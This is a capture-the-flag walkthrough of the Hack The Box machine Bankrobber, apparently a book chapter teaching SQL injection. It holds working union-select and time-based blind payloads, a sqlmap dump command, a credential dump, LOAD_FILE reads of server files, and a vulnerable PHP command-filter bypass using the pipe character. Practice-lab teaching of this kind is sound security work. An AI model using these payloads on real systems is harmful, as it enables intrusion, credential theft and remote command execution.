# Exercise: Using SQL injection on the Bankrobber box

In order to try out SQL injection, we will go back to the Hack The Box machine, Bankrobber. The XSS exploitation will gae us credentials for the admin user and with those, we can access the administration functionality of the site where you discover a user's search function that is SQL injectable.

![Search functionality available after logging in as admin on Bankrobber](../.gitbook/assets/2%20%289%29.png)

You know that it is SQL injectable through the following process: Simple numbers like 1 and 2 in the search query return users with those numbers as ids. Putting a single quote after the number results in an error that is returned saying that “There is a problem with your SQL syntax”. Adding the MySQL comment text 1'-- - into the search field then returns the user again.

Catching the entire search request in Burp \(turn on the Burp proxy option in FoxyProxy and click search to intercept the request in the Proxy tab, then send the request to the Repeater tab in Burp using CTL-R\) allows us to play with the SQL and determine that it is “union select” injectable. To determine the number of columns that the original query is returning, we can use the following injection and sending it via Burp repeater:

```sql
term=1'+order+by+1--+-
```

This returns one user from the request. Incrementing the order by clause to 4 returns an error “There is a problem with your SQL syntax” telling us that the number of columns in the original query was 3. This means you can now carry out a union select with the query string:

```sql
term=1'+union+select+'Field1','Field2',3--+-
```

This returns the output

```markup
HTTP/1.1 200 OK
Date: Thu, 01 Oct 2020 04:53:15 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Content-Length: 180
Connection: close
Content-Type: text/html; charset=UTF-8
<table width='90%'><tr><th>ID</th><th>User</th></tr>
 <tr>
 <td>1</td>
 <td>admin</td>
 </tr>
 <tr>
 <td>Field1</td>
 <td>Field2</td>
 </tr>
 </table>
```

Knowing that this is a union select injectable field and that the database is MySQL, you can dump the default database using the sqlmap command:

`sqlmap -r search.req --batch --dbms MySQL --technique U -p term --dump`

Without the parameters –dbms, --technique and -p sqlmap will determine these itself, but it is faster to provide them if you already know the answer.

sqlmap can carry out blind attacks by using timing techniques. These work by introducing a delay in the response if the answer to a query is true. An example of this given by OWASP for MySQL uses the BENCHMARK\(50000000,ENCODE\('MSG', 'by 5 seconds'\)\) statement to introduce an approximately 5 second pause. So the SQL statement

```sql
1' UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),
BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) 
FROM users WHERE user_id = 1
```

Will test if the first character in the password is ‘2’ \(assuming the password is in clear text\).

Whilst sqlmap can save time in obtaining information from SQL injection, it is always useful to know how to get the information manually. For example, in Bankrobber, you can list the databases in MariaDB with the command:

```sql
term=1'+union+select+'Field1',(SELECT group_concat(schema_name) 
FROM information_schema.schemata),3--+-
```

The response will include the databases

`bankrobber,information_schema,mysql,performance_schema,phpmyadmin,test`

The site, PayloadsAllTheThings has a SQL Injection Cheat Sheet that lists other commands for exploring databases.

We can list the tables in the database bankrobber with the following query:

```sql
term=1' union select 1,table_name,3 from INFORMATION_SCHEMA.TABLES 
where table_schema=database()-- -
```

This returns the tables: admin, balance, hold and users. We can list the columns in the users table using the command:

```sql
term=1' union select 1,group_concat(0x7c,column_name,0x7c),3 
from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

This returns the column names:

`|id|,|username|,|password|,|USER|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|`

Finally, we could list the usernames and passwords for the users:

```sql
term=1' union select 1,group_concat(username,0x3a,password),3 from users-- -
```

Which returns:

`admin:Hopelessromantic,gio:gio`

Nothing particularly useful. One function that you can use in SQL is the LOAD\_FILE function which will allow us to include a local file into the response. We can try it with a well known Windows file c:\Windows\win.ini

```sql
term=1' union select 1,LOAD_FILE('c:\\Windows\\win.ini'),3-- -
```

And sure enough, this returns the contents of the file:

```sql
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

If we enumerate the web directories with Gobuster we find for the root directory:

```bash
┌─[rin@parrot]─[~/boxes/Bankrobber]
└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -u http://bankrobber.htb
<SNIP>
/index.php (Status: 302)
/img (Status: 301)
/login.php (Status: 302)
/register.php (Status: 200)
/user (Status: 301)
/admin (Status: 301)
/link.php (Status: 200)
/css (Status: 301)
/Index.php (Status: 302)
/Login.php (Status: 302)
/js (Status: 301)
/notes.txt (Status: 200)
/logout.php (Status: 302)
/licenses (Status: 403)
```

The file of particular interest is notes.txt which when we look at says:

```text
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

The key bit of information is that the Xampp folder is in the default location. XAMPP is a product that packages up Apache, MariaDB, PHP and Perl to run web applications. MariaDB is compatible with MySQL and so is largely indistinguishable for our purposes.

Going back to the home page, there was another function called a We also know that the function called a Backdoorchecker that said it would allow the dir command but when you try it, you get an error message:

It's only allowed to access this function from localhost \(::1\).

This is due to the recent hack attempts on our server.

It would be worth looking at the code for this file which we can do using SQL injection

```sql
term=1' union select 1,LOAD_FILE('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -
```

This returns the code for backdoorchecker.php

```php
<?php
include('../link.php');
include('auth.php');
$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad = array('$(','&');
$good = "ls";
if(strtolower(substr(PHP_OS,0,3)) == "win"){
 $good = "dir";
}
if($username == "admin" && $password == "Hopelessromantic"){
if(isset($_POST['cmd'])){
 // FILTER ESCAPE CHARS
  foreach($bad as $char){
    if(strpos($_POST['cmd'],$char) !== false){
      die("You're not allowed to do that.");
    }
  }
 // CHECK IF THE FIRST 2 CHARS ARE LS
 if(substr($_POST['cmd'], 0,strlen($good)) != $good){
   die("It's only allowed to use the $good command");
 }
 if($_SERVER['REMOTE_ADDR'] == "::1"){
   system($_POST['cmd']);
 } else{
   echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
 }
 }
} else{
 echo "You are not allowed to use this function!";
}
?>
```

The key things about this code are that it checks that cookie has username with a value of "admin" and password with a value of "Hopelessromantic" u. It then checks that the command does not include '&' which would allow us to run a second command after the 'dir' command v. It checks that the command starts with 'dir' so that we can't substitute other commands instead w. It checks if the request came from the local machine x. Finally, it executes the command y. The flaw here is is that although it is checking for bad characters that could manipulate the command and run other arbitrary commands, it still allows us to use the '\|' character which works in the same way as the '&' after a command.

We can now run a command but we still need to do this using server-side request forgery using the XSS vulnerability as we did earlier in the chapter.

